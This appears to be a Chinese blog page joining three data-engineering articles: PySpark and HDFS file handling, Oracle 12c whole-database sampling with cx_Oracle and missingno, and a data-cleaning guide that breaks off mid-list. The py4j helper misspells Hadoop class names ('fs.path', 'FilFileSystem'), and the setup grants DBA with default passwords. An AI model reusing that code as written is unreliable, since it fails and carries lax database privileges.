${HADOOP_COMMON_HOME}/bin/hadoop fs -get /hdfspath/to/data.txt  /localpath/to/data.txt
或者，使用hdfs fs -copyToLocal命令：

${HADOOP_COMMON_HOME}/bin/hadoop fs -copyToLocal /hdfspath/to/data.txt  /localpath/to/data.txt

1.3.2 popen
使用popen 可以获取命令执行的返回值
os.popen(r'hadoop dfs -ls /user/').read()

1.3.3 subprocess
https://docs.python.org/2/library/subprocess.html
该子模块允许你创建新的流程，连接到它们的输入/输出/错误管道，并获取他们的返回值。该模块打算替换多个旧的模块和功能：os.system   和  os.spawn *
使用subprocess时建议使用run()函数去处理所有它可以处理的情况，因为高级用法可以直接使用底层POPEN接口。
run（）函数是Python 3.5中新添加的。
cat = subprocess.Popen(["hadoop", "fs", "-ls", "/user/hadoop/my_data"], stdout=subprocess.PIPE)
for line in cat.stdout:
    print (line)

输出：

b’Found 2 items\n’
b’-rw-r–r--   2 hadoop hadoop          0 2019-03-28 08:38 /user/hadoop/my_data/_SUCCESS\n’
b’-rw-r–r--   2 hadoop hadoop    6967144 2019-03-28 08:38 /user/hadoop/my_data/part-00000-9431d082-957d-4a0b-a3ae-4ffa4674c70e-c000.csv\n’

1.4 python 与 py4j 交互
http://aducode.github.io/posts/2016-08-02/write2hdfsinpyspark.html
python中调用java对象来操作hdfs文件

def path(sc, filepath):
  """
  创建hadoop path对象
  :param sc sparkContext对象
  :param filename 文件绝对路径
  :return org.apache.hadoop.fs.Path对象
  """
  path_class = sc._gateway.jvm.org.apache.hadoop.fs.path
  return path_class(filepath)

def get_file_system(sc):
  """
  创建FileSystem
  :param sc SparkContext
  :return FileSystem对象
  """
  filesystem_class = sc._gateway.jvm.org.apache.hadoop.fs.FilFileSystem
  hadoop_configuration = sc._jsc.hadoopConfiguration()
  return filesystem_class.get(hadoop_configuration)

def write(sc, filepath, content, overwite=True):
    """
  写内容到hdfs文件
  :param sc SparkContext
  :param filepath 绝对路径
  :param content 文件内容
  :param overwrite 是否覆盖
    """
    filesystem = get_file_system(sc)
    out = filesystem.create(path(sc, filepath), overwrite)
    out.write(bytearray(content, "utf-8"))
    out.flush()
    out.close()

write(sc, '/user/hadoop/my_data/ll.txt', 'shenmemgui', overwite=True)


2. pyspark 与driver 磁盘交互
直接写文件到磁盘（这个可以搭建一个本地的spark 单机版试试）
2.0版本后http://spark.apache.org/docs/latest/api/python/_modules/pyspark/sql/readwriter.html#DataFrameWriter.csv
对象引入的新方法
def csv(self, path, mode=None, compression=None, sep=None, quote=None, escape=None,
            header=None, nullValue=None, escapeQuotes=None, quoteAll=None, dateFormat=None,
            timestampFormat=None, ignoreLeadingWhiteSpace=None, ignoreTrailingWhiteSpace=None,
            charToEscapeQuoteEscaping=None, encoding=None, emptyValue=None)

##e.g.

import os
import tempfile
df.write.csv(os.path.join(tempfile.mkdtemp(), 'data'))
#或者
df.repartition(1).write.csv(path="file:///"+(os.path.join( os.getcwd(),'test')), mode="overwrite", header="true")

用的时候这么用，我还以为os 都出来这个坨坨移到driver 的本地文件上了，结果还是在hdfs 的文件系统中。
这个函数说明中有一句
path – the path in any Hadoop supported file system
我想如果可行的话还是先写到hdfs 再挪回本地吧
mode="overwrite"慎用，我就直接把当前目录里面notebook 一些代码给覆盖了，结果找到找不回来，痛心。或者可以将dataframe 转化成rdd 后用saveAsTextFile  写回本地磁盘。
综上所述，我认为还是先写到hdfs 上或者s3上面比较安全，然后通过命令合并好文件再保存到本地。

3. python docker 搭建spark standalone 版本
https://www.cnblogs.com/hongdada/p/9475406.html
docker search spark
docker pull sequenceiq/spark
# 结果发现上面版本中的spark 是1.X 的

docker search spark2.0

#随便下一个

#机器上的其他容器先关了
docker stop $(docker ps -aq)

docker run -dit -p 8088:8088 -p 8042:8042 -p 4040:4040 -h sandbox sequenceiq/spark



docker image ls













文章大纲0.简介1. cx_Oracle 简介与数据类型2.Oracle 12c 新特性容器数据库3.Oracle 12c 新建表空间、用户、表3.0 设置oracle sid 数据库实例名3.1 以管理员账户登录3.2 创建表空间3.3 创建用户并指定表空间3.4 用户授权3.5 创建样例表格3.6 数据导入导出4.python 环境准备5.Oracle  SQL 全库全表字段分析6.Oracle python 操作辅助类7.python 链接Oracle 全库数据采样8.python missingno 缺失值可视化分析

0.简介
想象如下一个场景，一个合作伙伴想让你分析一下自己的业务数据，比较慷慨的给出了数据全库。但是对方的IT 人员没有精力去协助我们逐个了解数据怎么办呢，这时候就需要进行一些针对数据库的探索性、描述性的数据分析 帮我们更好的了解对方的数据内涵了。
下面就以Oracle 为例，使用python 进行全库数据描述性及探索性逆向分析。

1. cx_Oracle 简介与数据类型
说到python 链接Oracle ，就不得不提到cx_Oracle ，cx_Oracle is a module that enables access to Oracle Database and conforms to the Python database API specification.
cx_Oracle 目前是oracle 官方 出品的python Oracle链接管理包
cx_Oracle 源代码：https://github.com/oracle/python-cx_Oracle
文档：https://cx-oracle.readthedocs.io/en/latest/index.html
Oracle - cx_Oracle - Python 映射为：
Oracle


cx_Oracle


Python


VARCHAR2
NVARCHAR2
LONG

cx_Oracle.STRING


str


CHAR


cx_Oracle.FIXED_CHAR


NUMBER


cx_Oracle.NUMBER


int


FLOAT


float


DATE


cx_Oracle.DATETIME


datetime.datetime


TIMESTAMP


cx_Oracle.TIMESTAMP


CLOB


cx_Oracle.CLOB


cx_Oracle.LOB


BLOB


cx_Oracle.BLOB



2.Oracle 12c 新特性容器数据库
一般来说对于Oracle 高版本的数据库是向下兼容的，所以我们目前使用Oracle 12c  进行本次说明。
Oracle 12C引入了CDB与PDB的新特性，在ORACLE 12C数据库引入的多租用户环境（Multitenant Environment）中，允许一个数据库容器（CDB）承载多个可插拔数据库（PDB）。CDB全称为Container Database，中文翻译为数据库容器，PDB全称为Pluggable Database，即可插拔数据库。在ORACLE 12C之前，实例与数据库是一对一或多对一关系（RAC）：即一个实例只能与一个数据库相关联，数据库可以被多个实例所加载。而实例与数据库不可能是一对多的关系。当进入ORACLE 12C后，实例与数据库可以是一对多的关系。下面是官方文档关于CDB与PDB的关系图。

简介详见：
https://www.cnblogs.com/kerrycode/p/3386917.html
及官方文档：
https://docs.oracle.com/en/database/oracle/oracle-database/12.2/index.html
oracle 执行 SQL ：
https://docs.oracle.com/en/database/oracle/oracle-database/12.2/cncpt/sql.html#GUID-DA48618A-A6BB-421A-A10A-02859D8ED9AD

3.Oracle 12c 新建表空间、用户、表
在windows 下，我们使用PL/sql  以及sqlplus 进行Oracle 的管理工作，sqlplus  是安装好Oracle 就自带了。
3.0 设置oracle sid 数据库实例名
在cmd 命令行窗口使用sqlplus  之前需要进行数据库实例名 的指定。
set oracle_sid=orcl

3.1 以管理员账户登录
sqlplus sys/sys as sysdba;

3.2 创建表空间
创建用户之前需要创建表空间。

# -- 2.1 创建临时空间
create temporary tablespace test 
tempfile 'E:\table\test.dbf' 
size 5m 
autoextend on 
next 10m  
extent management local;


# -- 2.2 创建数据表空间

create tablespace test_data
logging
datafile 'E:\table\test_data.dbf'
size 10m
autoextend on
next 10m
maxsize unlimited
extent management local;

3.3 创建用户并指定表空间
有了表空间，我们可以在创建用户的时候给用户指定表空间。
# -- 3.创建用户并指定表空间

-- 刚开始用户名为 ，提示错误ORA-65096：公用用户名或角色名无效，网上查资料，说是取名前缀必须为c##，
--所以用户名也变成了c##test
--首次创建用户时提示test_data表空间不存，重启了服务就创建成功
create user c##test identified by test
default tablespace test_data
temporary tablespace test;

3.4 用户授权
根据需要设置权限

GRANT CREATE ANY VIEW,DROP ANY VIEW,CONNECT,RESOURCE,CREATE SESSION,DBA TO c##test;

3.5 创建样例表格
为了我们后面的分析方便，我们自己创建两个样例表格进行举例，其实真实的情况一般是 参照第6小节数据导入导出，进行原始数据的，导入导出。
注意创建表的时候添加了comment ，这样方便我们DBA 或者逆向探索时候能够理解表格的含义。一般的真实情况是，数据库建表过程中，良好习惯的DBA 会按照一定的命名规范建表，命名字段及编写注释。 这就给我们逆向理解合作伙伴的业务提供了便利条件。
--建立表 DEPT和删除表;

DROP TABLE DEPT cascade constraints;
CREATE TABLE DEPT
       (DEPTNO NUMBER(2) CONSTRAINT PK_DEPT PRIMARY KEY,
    DNAME VARCHAR2(14) ,
    LOC VARCHAR2(13) ) ;
-- 增加表注释    
comment on table C##TEST.DEPT
  is '部门表';
comment on column C##TEST.DEPT.deptno
  is '部门编号';
comment on column C##TEST.DEPT.dname
  is '部门名称';
comment on column C##TEST.DEPT.loc
  is '部门位置';
 
--建立表 EMP和删除表;
DROP TABLE EMP;
CREATE TABLE EMP
       (EMPNO NUMBER(4) CONSTRAINT PK_EMP PRIMARY KEY,
    ENAME VARCHAR2(10),
    JOB VARCHAR2(9),
    MGR NUMBER(4),
    HIREDATE DATE,
    SAL NUMBER(7,2),
    COMM NUMBER(7,2),
    DEPTNO NUMBER(2) CONSTRAINT FK_DEPTNO REFERENCES DEPT);
 
---插入dept语句块;
INSERT INTO DEPT VALUES
    (10,'ACCOUNTING','NEW YORK');
INSERT INTO DEPT VALUES (20,'RESEARCH','DALLAS');
INSERT INTO DEPT VALUES
    (30,'SALES','CHICAGO');
INSERT INTO DEPT VALUES
    (40,'OPERATIONS','BOSTON');
 
---插入EMP语句块;
INSERT INTO EMP VALUES
(7369,'SMITH','CLERK',7902,to_date('17-12-1980','dd-mm-yyyy'),800,NULL,20);
INSERT INTO EMP VALUES
(7499,'ALLEN','SALESMAN',7698,to_date('20-2-1981','dd-mm-yyyy'),1600,300,30);
INSERT INTO EMP VALUES
(7521,'WARD','SALESMAN',7698,to_date('22-2-1981','dd-mm-yyyy'),1250,500,30);
INSERT INTO EMP VALUES
(7566,'JONES','MANAGER',7839,to_date('2-4-1981','dd-mm-yyyy'),2975,NULL,20);
INSERT INTO EMP VALUES
(7654,'MARTIN','SALESMAN',7698,to_date('28-9-1981','dd-mm-yyyy'),1250,1400,30);
INSERT INTO EMP VALUES
(7698,'BLAKE','MANAGER',7839,to_date('1-5-1981','dd-mm-yyyy'),2850,NULL,30);
INSERT INTO EMP VALUES
(7782,'CLARK','MANAGER',7839,to_date('9-6-1981','dd-mm-yyyy'),2450,NULL,10);
INSERT INTO EMP VALUES
(7788,'SCOTT','ANALYST',7566,to_date('12-06-1987','dd-mm-yyyy')-85,3000,NULL,20);
INSERT INTO EMP VALUES
(7839,'KING','PRESIDENT',NULL,to_date('17-11-1981','dd-mm-yyyy'),5000,NULL,10);
INSERT INTO EMP VALUES
(7844,'TURNER','SALESMAN',7698,to_date('8-9-1981','dd-mm-yyyy'),1500,0,30);
INSERT INTO EMP VALUES
(7876,'ADAMS','CLERK',7788,to_date('13-06-1987','dd-mm-yyyy')-51,1100,NULL,20);
INSERT INTO EMP VALUES
(7900,'JAMES','CLERK',7698,to_date('3-12-1981','dd-mm-yyyy'),950,NULL,30);
INSERT INTO EMP VALUES
(7902,'FORD','ANALYST',7566,to_date('3-12-1981','dd-mm-yyyy'),3000,NULL,20);
INSERT INTO EMP VALUES
(7934,'MILLER','CLERK',7782,to_date('23-1-1982','dd-mm-yyyy'),1300,NULL,10);
 
 
-- 提交插入
COMMIT;
 
--查询部分;
select * from emp;
select * from dept;

3.6 数据导入导出
imp/exp  ，impdp/expdp需要成对使用
以下分别给出两个导入样例
imp c##test/test@orcl file=D:20190506.DMP full=y log=01.log


impdp c##test/test@orcl directory=dir logfile=p_street_area.log  job_name=my_job


4.python 环境准备
参考该文章：1.2.4 小节conda基本环境配置
https://blog.csdn.net/wangyaninglm/article/details/89440922
使用如下 requirements.txt 初始化环境
conda create --name DATABASE --file requirements.txt

# This file may be used to create an environment using:
# $ conda create --name <env> --file <this file>
# platform: win-64
backcall=0.1.0=py37_0
blas=1.0=mkl
ca-certificates=2019.1.23=0
certifi=2019.3.9=py37_0
colorama=0.4.1=py37_0
cx_oracle=7.0.0=py37h62dcd97_0
decorator=4.4.0=py37_1
icc_rt=2019.0.0=h0cc432a_1
intel-openmp=2019.3=203
ipykernel=5.1.0=py37h39e3cac_0
ipython=7.5.0=py37h39e3cac_0
ipython_genutils=0.2.0=py37_0
jedi=0.13.3=py37_0
jupyter_client=5.2.4=py37_0
jupyter_core=4.4.0=py37_0
libsodium=1.0.16=h9d3ae62_0
mkl=2019.3=203
mkl_fft=1.0.12=py37h14836fe_0
mkl_random=1.0.2=py37h343c172_0
numpy=1.16.4=py37h19fb1c0_0
numpy-base=1.16.4=py37hc3f5095_0
openssl=1.1.1c=he774522_1
pandas=0.24.2=py37ha925a31_0
parso=0.4.0=py_0
pickleshare=0.7.5=py37_0
pip=19.1.1=py37_0
prompt_toolkit=2.0.9=py37_0
pygments=2.4.0=py_0
python=3.7.3=h8c8aaf0_1
python-dateutil=2.8.0=py37_0
pytz=2019.1=py_0
pyzmq=18.0.0=py37ha925a31_0
setuptools=41.0.1=py37_0
six=1.12.0=py37_0
sqlite=3.28.0=he774522_0
tornado=6.0.2=py37he774522_0
traitlets=4.3.2=py37_0
vc=14.1=h0510ff6_4
vs2015_runtime=14.15.26706=h3a45250_4
wcwidth=0.1.7=py37_0
wheel=0.33.4=py37_0
wincertstore=0.2=py37_0
zeromq=4.3.1=h33f27b4_3


# 为了能让jupyter 使用这个 kernel
#直接 切换到 需要显示 的 隔离环境
conda install ipykernel
#or
conda install -n python_env ipykernel


5.Oracle  SQL 全库全表字段分析
在Oracle 中进行 全库全表字段分析需要用的一个非常重要的表：USER_TABLES
什么是USER_TABLES ？
USER_TABLES describes the relational tables owned by the current user. Its columns (except for OWNER) are the same as those in ALL_TABLES.
USER_TABLES  和ALL_TABLES 字段一样，我们来看看文档里面ALL_TABLES  有哪些有用的字段：
ALL_TABLES
Related Views


DBA_TABLES describes all relational tables in the database.


USER_TABLES describes the relational tables owned by the current user. This view does not display the OWNER column.



Note:Columns marked with an asterisk (*) are populated only if you collect statistics on the table with the DBMS_STATS package.

对我们有用的字段拿几个先看看：

 SELECT a.num_rows, a.table_name, b.comments
  FROM user_tables a, user_tab_comments b
 WHERE a.table_name = b.table_name
 ORDER BY num_rows DESC

可以看到 写了注释的表，都展现出来注释了。

可以看到刚刚插入完数据，num_rows 没有更新
隔了一天以后， 数据就有了：

如果想要立即更新USER_TABLES   或者参照下面链接
Oracle manually update statistics on all tables
运行，手动更新：
exec DBMS_STATS.GATHER_DATABASE_STATS;

一般来说，USER_TABLES不会自动更新，oracle 会在闲时或者定时更新这张表。所以入数据以后不一定 多久会看到USER_TABLES 的更新。
SELECT t_column_comments.table_name,
       t_table_comments.comments     表名,
       t_table_comments.num_rows     表行数,
       t_table_comments.avg_row_len  表平均长度,
       t_column_comments.column_name,
       t_column_comments.comments    字段名
  FROM (SELECT *
          FROM all_col_comments
         WHERE table_name IN (SELECT table_name FROM user_tables)) t_column_comments,
       
       (SELECT a.num_rows, a.table_name, b.comments, a.avg_row_len
          FROM user_tables a, user_tab_comments b
         WHERE a.table_name = b.table_name) t_table_comments

 WHERE t_table_comments.table_name = t_column_comments.table_name
 ORDER BY t_column_comments.table_name

可以看到如下的导出表基本上符合人的观察规范，适合进行Oracle 全库的描述性、探索性数据分析。比如合作伙伴将全库共享，我们如何第一时间通过数据了解合作伙伴的业务情况和设计呢。我想可以通过这样的手段，首先有一个大致的认识，接下来就是进一步看看样例数据的样子了。那么我们用这个导出表作为基础，写点python代码进一步进行数据探索性分析。


6.Oracle python 操作辅助类
通过编写OracleBaseTool， 这个操作辅助类，主要目的是对于以下一些动作进行封装：

1.数据库的链接（初始化）
2.数据库链接的管理
3.数据库的查询管理

#!/usr/bin/env python
# -*- encoding: utf-8 -*-
#-------------------------------------------------------------------------------
'''
@Author  :   {SEASON}
@License :   (C) Copyright 2013-2022, {OLD_IT_WANG}
@Contact :   {shiter@live.cn}
@Software:   PyCharm
@File    :   DataBase -- OracleBaseTool
@Time    :   2019/5/22 17:10
@Desc    :

'''
#-------------------------------------------------------------------------------

import cx_Oracle

class OracleBaseTool():
    """OracleBaseTool"""

    def __init__(self,user_name,password,ip,service_name):

        self.user_name = user_name
        self.password = password
        self.ip = ip
        self.service_name = service_name
        self.connectObj = ""
        self.connCnt = 0
        self.cursorCnt = 0

    def initOracleConnect(self):
        oracle_tns = cx_Oracle.makedsn(self.ip, 1521, self.service_name)
        if self.connCnt == 0:
            self.connectObj = cx_Oracle.connect(self.user_name, self.password, oracle_tns)
            self.connCnt += 1

    def getConnOracle(self,user_name, password, ip, service_name):
        try:
            self.connectObj = cx_Oracle.connect(user_name + '/' + password + '@' + ip + '/' + service_name)  # 连接数据库
            self.connCnt += 1
        except Exception:
            print(Exception)

    def getOracleConnect(self):
        self.initOracleConnect()
        return self.connectObj

    def closeOracleConnect(self, connectObj):
        connectObj.close()
        self.connCnt -= 1

    def getOracleCursor(self):
        self.initOracleConnect()
        self.cursorCnt += 1
        return self.connectObj.cursor()

    def closeOracleCursor(self, cursorObj):
        cursorObj.close()
        self.cursorCnt -= 1

        if self.cursorCnt == 0:
            print("will close conn")
            self.closeOracleConnect(self.connectObj)

    def selectFromDbTable(self, sql, argsDict=None):
        # 将查询结果由tuple转为list,并返回
        queryAnsList = []
        selectCursor = self.getOracleCursor()
        selectCursor.prepare(sql)
        if argsDict==None:
            queryAns = selectCursor.execute(sql)
        else:
            queryAns = selectCursor.execute(None, argsDict)

        for ansItem in queryAns:
            queryAnsList.append(list(ansItem))

        self.closeOracleCursor(selectCursor)
        return queryAnsList

    def selectFromDbTable_WithTableHead(self, sql, argsDict=None):
        # 将查询结果由tuple转为list,并返回,带表头
        queryAnsList = []
        selectCursor = self.getOracleCursor()
        selectCursor.prepare(sql)
        if argsDict==None:
            queryAns = selectCursor.execute(sql)
        else:
            queryAns = selectCursor.execute(None, argsDict)

         # 获取表的列名
        title = [i[0] for i in selectCursor.description]
        queryAnsList.append(list(title))

        for ansItem in queryAns:
            queryAnsList.append(list(ansItem))


        self.closeOracleCursor(selectCursor)
        return queryAnsList

    def selectFromDbTablefor_SampleData(self, sql, argsDict=None,intSampleNumber = 1):
        '''获取intSampleNumber 条样例数据，带表头'''
        queryAnsList = []
        selectCursor = self.getOracleCursor()
        selectCursor.prepare(sql)
        if argsDict==None:
            selectCursor.execute(sql)
            queryAns = selectCursor.fetchmany(intSampleNumber)
        else:
            queryAns = selectCursor.execute(None, argsDict)
            queryAns = selectCursor.fetchmany(intSampleNumber)

        # 获取表的列名
        title = [i[0] for i in selectCursor.description]
        queryAnsList.append(list(title))

        for ansItem in queryAns:
            queryAnsList.append(list(ansItem))

        self.closeOracleCursor(selectCursor)
        return queryAnsList


7.python 链接Oracle 全库数据采样
本节主要用到了上面的操作类，使用oracle 的user_tables 获取数据的所有表名称，之后按照采样设置进行链接及采样，并根据采样数据计算数据缺失率，以求初步了解数据和业务的紧密关联。最后用pandas 保存为excel 方便查看。
其中采样的功能主要用到了Oracle 中的sample 函数，具体大家可以查看文档：
Oracle 表采样
以下脚本主要有两大功能：

各个表中数据列缺失值统计（采样缺失值，如采样10000条）
从各个表中获取数据样例


#!/usr/bin/env python
# -*- encoding: utf-8 -*-
#-------------------------------------------------------------------------------
'''
@Author  :   {SEASON}
@License :   (C) Copyright 2013-2022, {OLD_IT_WANG}
@Contact :   {shiter@live.cn}
@Software:   PyCharm
@File    :   DataBase -- GetSampleData
@Time    :   2019/5/22 15:41
@Desc    :

'''
#-------------------------------------------------------------------------------

import pandas as pd
# from __future__ import print_function

import cx_Oracle
import OracleBaseTool
import os
#应对出现 illegal multibyte sequence 问题
os.environ['nls_lang'] = 'AMERICAN_AMERICA.AL32UTF8'


#生成数据库所有表名、表名注释及行数
sql_string_all_tables = '''
SELECT a.num_rows, a.table_name, b.comments
  FROM user_tables a, user_tab_comments b
 WHERE a.table_name = b.table_name
 ORDER BY num_rows DESC 
        '''

#     sql_string2= '''select a.num_rows, a.TABLE_NAME, b.COMMENTS from user_tables a, user_tab_comments b
#         WHERE a.TABLE_NAME = b.TABLE_NAME and a.TABLE_NAME = :content
#         order by num_rows desc'''

    #named_params = {'content': 'MZ_FYMXB'}
    # 传参的sql语句写法
    # result_list= HIS_oracle_object.selectFromDbTable(sql_string2,named_params)

#生成数据库所有表名、表名注释及行数,字段名，字段注释
sql_string_all_columns = '''
SELECT t_column_comments.table_name,
       t_table_comments.comments     表名,
       t_table_comments.num_rows     表行数,
       t_table_comments.avg_row_len  表平均长度,
       t_column_comments.column_name,
       t_column_comments.comments    字段名
  FROM (SELECT *
          FROM all_col_comments
         WHERE table_name IN (SELECT table_name FROM user_tables)) t_column_comments,
       
       (SELECT a.num_rows, a.table_name, b.comments, a.avg_row_len
          FROM user_tables a, user_tab_comments b
         WHERE a.table_name = b.table_name) t_table_comments

 WHERE t_table_comments.table_name = t_column_comments.table_name
 ORDER BY t_column_comments.table_name

    '''

# 链接oracle
test_oracle_obj = OracleBaseTool.OracleBaseTool(
    'c##test', 'test', '127.0.0.1', 'orcl')

result_list = test_oracle_obj.selectFromDbTable(sql_string_all_tables)
result_list_schemaDetail = test_oracle_obj.selectFromDbTable_WithTableHead(
    sql_string_all_columns)


result_list_schemaDetail_pdf = pd.DataFrame(
    result_list_schemaDetail[1:], columns=result_list_schemaDetail[0])

# 设置采样数据组数，即为 从表中读取几条样例数据
sample_number = 10000

result_list_schemaDetail_pdf['缺失值比例'] = None
# 采样5个sample data 作为column name
for i in range(1, 5+1):
    result_list_schemaDetail_pdf['sample_data'+str(i)] = None


# 获取5条样例数据,遍历每一张表
for x in result_list:
    table_row_number = x[0]
    table_name = x[1]
    table_comments = x[2]
    
    if table_row_number > sample_number*10:
        #大于10000行的表进行采样
        #select * from table_name sample(10) where rownum<=5
        sql_string_forsampledata = '''select * from ''' + table_name + ''' sample(10) where rownum<=1000'''
    else:
        #小于10000行的表 随便选
        sql_string_forsampledata = '''select * from ''' + table_name
        
    result_list_sampleData = test_oracle_obj.selectFromDbTablefor_SampleData(
        sql_string_forsampledata, None, sample_number)

    result_list_sampleData_pdf = pd.DataFrame(
        result_list_sampleData[1:], columns=result_list_sampleData[0])
# 将 采样的5个样例值写入后面

# 不一定有10000条数据
    样例数据条数 = len(result_list_sampleData)-1
    列数量 = len(result_list_sampleData[0])

    for column_number in range(0, 列数量):
        #获取到table_name  及string_column_name 对应的行号
        string_column_name = result_list_sampleData[0][column_number]
        index_number = result_list_schemaDetail_pdf[
            (result_list_schemaDetail_pdf['TABLE_NAME'] == table_name) & (
                result_list_schemaDetail_pdf['COLUMN_NAME'] == string_column_name)].index
        # 计算该column 的缺失值比例
        缺失值比例_dict = dict(result_list_sampleData_pdf.isnull().sum() / 样例数据条数)
        result_list_schemaDetail_pdf.loc[index_number,
                                         '缺失值比例'] = 缺失值比例_dict[string_column_name]
        if 样例数据条数 > 5:
            int_sample = 5
        else:
            int_sample = 样例数据条数

        for x in range(1, int_sample+1):
        #对该 column 进行数据采样，并写入pandas 对应位置
            str_sample_data_column_name = 'sample_data' + str(x)
            sample_data_column_value = result_list_sampleData[x][column_number]
            result_list_schemaDetail_pdf.loc[index_number,
                                         str_sample_data_column_name] = sample_data_column_value

最后一步写入excel ，结合excel 的一些筛选统计工作，我们可以让协助的业务部门，架构部门也更好的了解整个合作伙伴的数据

代码如下：使用前记得安装
conda install openpyxl

#  pandas to excel 由于是第三方库，写的时候可能报错，如
# "'utf8' codec can't decode byte 0xe9 in position 1: invalid continuation byte"
# 所以一般强制，字符集写成 utf-8

writer = pd.ExcelWriter('output_test.xlsx')

result_list_schemaDetail_pdf.to_excel(writer, 'schema')
writer.save()



8.python missingno 缺失值可视化分析
主要用到missingno  对缺失值进行可视化分析，what is missingno
missingno provides a small toolset of flexible and easy-to-use missing data visualizations and utilities that allows you to get a quick visual summary of the completeness (or lack thereof) of your dataset.
github 链接:https://github.com/ResidentMario/missingno
对于我们的测试库, 以下代码运行在jupyter notebook 中
test_oracle_obj = OracleBaseTool.OracleBaseTool('c##test','test','127.0.0.1','orcl')

sql_string = '''select * from EMP'''
result_list = test_oracle_obj.selectFromDbTable_WithTableHead(sql_string)

%matplotlib inline
import missingno
pdf = pd.DataFrame(result_list[1:], columns = result_list[0] )
missingno.matrix(pdf, labels=True)


柱状图分析，该图按照数据排序，可视化了数据空缺的空间视图。

条形图， 该图展现缺失值数量对比情况。
missingno.bar(pdf)


缺失值的相关性分析，既 一个变量的缺失和另一个变量 的关系，由于我们的样例数据较少，所以效果不明显，我们同时看一个官网的例子。
missingno.heatmap(pdf)



缺失值的层次聚类分析，内在逻辑和上面类似，不过是用了不同的算法及展现形式。
missingno.dendrogram(pdf)












文章大纲统一数据接入数据清洗的目的解决数据质量问题让数据更适合做挖掘、展示、分析数据清洗的步骤第0步：数据导入及元数据处理第一步：缺失值清洗第二步：格式内容清洗第三步：逻辑错误清洗第四步：非需求数据清洗第五步：关联性验证数据采集建议一行代码探索性数据分析数据预处理参考文献

我们目前进入了一个大数据的时代。以我目前经常处理的医疗保健数据为例。
随着时间的推移医疗保健数据的生成速度越来越快，预计到2020年将达到35 ZB（1ZB大约是10的9次方TB）。无论是出于患者护理、研究还是法律原因，能够经济高效、安全地管理这些数据对医疗保健提供者来说都越来越重要。
医疗保健提供商必须能够摄取、存储和保护大量数据，包括临床、基因组、设备、财务、供应链和保险理赔等。
本文尝试从数据 挖掘、分析的一般步骤入手，基于理论化的描述结合具体例子详细介绍挖掘分析建模之前数据处理的目的及方法论。
数据分析的一般流程：


确定目标
获取数据源
数据探索
数据预处理
挖掘分析建模
模型效果评价


借用一张同事绘制的图片


统一数据接入
数据接入，尤其是针对目前多元异构数据的(批处理数据、实时数据流式数据)接入，我们称之为统一数据接入。
文章链接：统一数据接入实践分享

数据清洗的目的
数据清洗， 是整个数据分析过程中不可缺少的一个环节，其结果质量直接关系到模型效果和最终结论。在实际操作中，数据清洗通常会占据分析过程的50%—80%的时间。
数据清洗的目的从两个角度来讲：
一、是为了解决数据质量问题
二、是让数据更适合做挖掘、展示、分析

解决数据质量问题
解决数据质量问题，其实就是为了确保以下几点：
针对每一点我们分别来看


数据的完整性


例如人的属性中缺少性别、年龄等


数据的唯一性


例如不同来源的数据出现重复的情况，比如本次数据中我们基本信息中的序号，有部分重复的数据。这个可能是由于数据录入两次造成的。


数据的权威性


例如同一个指标出现多个来源的数据，且数值不一样


数据的合法性


例如获取的数据与常识不符，年龄大于150岁


数据的一致性


例如不同来源的不同指标，实际内涵是一样的，或是同一指标内涵不一致

让数据更适合做挖掘、展示、分析
从这个角度讲，数据清洗的工作更偏向工程，不是我们这次关注的重点.（有时间、有兴趣的话会后详细讨论，就不占用大家时间了。）
让数据更适合做挖掘、展示、分析，有以下一些手段对数据进行清洗。

高维度----不适合挖掘


思路：降维，方法包括但不限于：
主成分分析PCA
随机森林


维度太低----不适合挖掘


思路：抽象，方法包括但不限于：
各种汇总，平均、加总、最大、最小等
各种离散化，聚类、自定义分组等


无关信息----减少存储


解决方法：剔除字段


字段冗余


一个字段是其他字段计算出来的，会造成相关系数为1或者主成因分析异常
解决方法：剔除字段


多指标数值、单位不同


如GDP与城镇居民人均收入数值相差过大
解决方法：归一化，方法包括但不限于：
最小-最大
零-均值
小数定标

数据清洗的步骤

第0步：数据导入及元数据处理
数据导入及元数据处理阶段主要主要关注两件事情：
1.了解数据量
通过了解数据量（批处理，还是流式数据），将数据导入处理工具或者平台。通常来说，数据量不大的情况建议使用数据库。
如果数据量大（千万级以上），可以使用hadoop文本文件存储+Python操作的方式。
这个步骤对于批处理，文件交换的方式通常比较会引起问题是文件编码，推荐统一使用UTF-8编码。
2.了解元数据
这里包含两个部分：
一是看元数据，包括字段解释、数据来源、代码表等等一切描述数据的信息；如果数据是多维度的我们要弄清楚数据之间的关联关系。
二是抽取一部分数据，使用人工查看方式，对数据本身有一个直观的了解，并且初步发现一些问题，为之后的处理做准备。
第一步：缺失值清洗
缺失值是最常见的数据问题，处理缺失值也有很多方法，我建议按照以下四个步骤进行：
1、确定缺失值比例和范围
对每个字段都计算其缺失值比例，然后按照缺失比例和字段重要性，分别制定策略，可用下图表示：

2、去除不需要的字段
这一步很简单，直接删掉即可……但强烈建议清洗每做一步都备份一下，或者在小规模数据上试验成功再处理全量数据，不然删错了会追悔莫及（多说一句，写SQL的时候delete一定要配where！）。
3、填充缺失内容
某些缺失值可以进行填充，方法有以下三种：
以业务知识或经验推测填充缺失值
以同一指标的计算结果（均值、中位数、众数等）填充缺失值
以不同指标的计算结果填充缺失值
前两种方法比较好理解。关于第三种方法，举个最简单的例子：年龄字段缺失，但是有部分脱敏可以计算年龄的身份证号
4、重新获取数据
如果某些指标非常重要又缺失率高，那就需要和取数人员或业务人员了解，是否有其他渠道可以取到相关数据。
以上，简单的梳理了缺失值清洗的步骤，但其中有一些内容在实际工程应用中会更加复杂。
比如填充缺失值。很多讲统计方法或统计工具的书籍会提到相关方法。
第二步：格式内容清洗
如果数据是由系统日志而来，那么通常在格式和内容方面，会与元数据的描述一致。
而如果数据是由人工收集或用户填写而来，则有很大可能性在格式和内容上存在一些问题，简单来说，格式内容问题有以下几类：
1、修正格式的统一
时间、日期、数值、全半角等显示格式不一致
这种问题通常与输入端有关，在整合多来源数据时也有可能遇到，将其处理成一致的某种格式即可。
2、修正内容类型的统一
内容中有不该存在的字符
某些内容可能只包括一部分字符，比如身份证号是数字+字母，中国人姓名是汉字（赵C这种情况还是少数）。最典型的就是头、尾、中间的空格，也可能出现姓名中存在数字符号、身份证号中出现汉字等问题。
这种情况下，需要以半自动校验（正则表达式）半人工方式来找出可能存在的问题，并去除不需要的字符。
3、内容与该字段应有内容不符
姓名写了性别，身份证号写了手机号等等，均属这种问题。 但该问题特殊性在于：如果数据很重要那么不能简单的以删除来处理，因为成因有可能是人工填写错误，也有可能是前端没有校验，还有可能是导入数据时部分或全部存在列没有对齐的问题，因此要详细识别问题类型。
